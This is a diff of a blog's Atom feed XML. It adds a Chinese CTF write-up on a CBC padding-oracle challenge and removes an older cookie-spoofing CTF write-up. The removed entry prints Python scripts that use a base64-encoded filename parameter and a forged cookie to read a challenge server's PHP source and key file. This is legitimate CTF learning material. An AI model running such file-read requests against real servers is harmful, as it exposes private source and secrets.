@@ -39,6 +39,32 @@
   </entry>
   
   <entry>
+    <title>CBC加密模式攻击-集成题目</title>
+    <link href="https://bufsnake.github.io/CBC%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E6%94%BB%E5%87%BB-%E9%9B%86%E6%88%90%E9%A2%98%E7%9B%AE.html"/>
+    <id>https://bufsnake.github.io/CBC加密模式攻击-集成题目.html</id>
+    <published>2020-04-27T03:35:21.000Z</published>
+    <updated>2020-04-27T03:43:25.492Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目来源：[NPUCTF2020]web BUU已经有了</p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>打开链接得到源码</p><p>测试加密</p><p>得到</p><p>IV:6666666666666666</p><p>ly7auKVQCZWum/W/4osuPA==</p><p><img src="/images/pasted-249.png" srcset="/img/loading.gif" alt="upload successful"></p><p>测试解密，得到 1<br>这里的</p><pre><code class="php">return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;);</code></pre><p>运用短路运算，要么返回 1 要么返回 False</p><p>所以利用点为padding oracle attack</p><p><img src="/images/pasted-250.png" srcset="/img/loading.gif" alt="upload successful"></p><p>脚本如下</p><p><img src="/images/pasted-251.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结果如下</p><p><img src="/images/pasted-252.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到第二关的地址：FlagIsHere.php</p><p><img src="/images/pasted-253.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>访问FlagIsHere.php得到源码</p><p><img src="/images/pasted-254.png" srcset="/img/loading.gif" alt="upload successful"></p><p>由源码可知</p><pre><code class="php">$lalala = &#39;piapiapiapia&#39;;$iv = base64_decode(&#39;JwaFITevixiv4BbxHCph7A==&#39;);$tmp_id = &#39;weber&#39;;</code></pre><p>所以可以得到下面公式：</p><p><img src="/images/pasted-257.png" srcset="/img/loading.gif" alt="upload successful"></p><p>脚本如下：</p><p><img src="/images/pasted-255.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结果如下：</p><p><img src="/images/pasted-256.png" srcset="/img/loading.gif" alt="upload successful"></p><p>由于得到的连接失效了，所以就没有继续下去</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;题目来源：[NPUCTF2020]web BUU已经有了&lt;/p&gt;
+&lt;h2 id=&quot;第一关&quot;&gt;&lt;a href=&quot;#第一关&quot; class=&quot;he
+      
+    
+    </summary>
+    
+      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
+    
+    
+      <category term="web" scheme="https://bufsnake.github.io/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Padding Oracle Attack</title>
     <link href="https://bufsnake.github.io/Padding-Oracle-Attack.html"/>
     <id>https://bufsnake.github.io/Padding-Oracle-Attack.html</id>
@@ -504,35 +530,6 @@
 &lt;p&gt;一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;
-      
-    
-    </summary>
-    
-      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
-    
-    
-      <category term="web" scheme="https://bufsnake.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>cookie欺骗 writeup</title>
-    <link href="https://bufsnake.github.io/cookie%E6%AC%BA%E9%AA%97-writeup.html"/>
-    <id>https://bufsnake.github.io/cookie欺骗-writeup.html</id>
-    <published>2019-08-21T07:08:16.000Z</published>
-    <updated>2019-12-09T05:15:22.357Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p>Begin</p></blockquote><p><img src="/images/pasted-113.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>发现filename为keys.txt的base64加密，试着读取index.php文件</p></blockquote><p><img src="/images/pasted-114.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>发现能读到东西了，接下来读取整个文件</p></blockquote><pre><code class="python">from requests import *from base64 import *for i in range(0,20):    url = &quot;http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw&quot;%i    respone = get(url=url)    print respone.text</code></pre><pre><code class="php">&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);$line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;if($file==&#39;&#39;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(    &#39;0&#39; =&gt;&#39;keys.txt&#39;,    &#39;1&#39; =&gt;&#39;index.php&#39;,);if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;){    $file_list[2]=&#39;keys.php&#39;;}if(in_array($file, $file_list)){    $fa = file($file);    echo $fa[$line];}?&gt;</code></pre><blockquote><p>逻辑不难，要求我们将cookie设置成margin=margin，然后在用相同的办法读取keys.php</p></blockquote><pre><code class="python">from requests import *from base64 import *for i in range(0,20):    url = &quot;http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=%s&quot;%(i,b64encode(&quot;keys.php&quot;))    header = {        &quot;Cookie&quot;: &quot;margin=margin&quot;    }    res = get(url=url,headers=header)    print res.text</code></pre><pre><code class="php">&lt;?php $key=&#39;KEY{key_keys}&#39;; ?&gt;</code></pre><blockquote><p>得到flag：KEY{key_keys}</p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;p&gt;Begin&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pasted-113.png&quot; srcset=&quot;/img/loading.gif&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
-&lt;blockqu
       
     
     </summary>
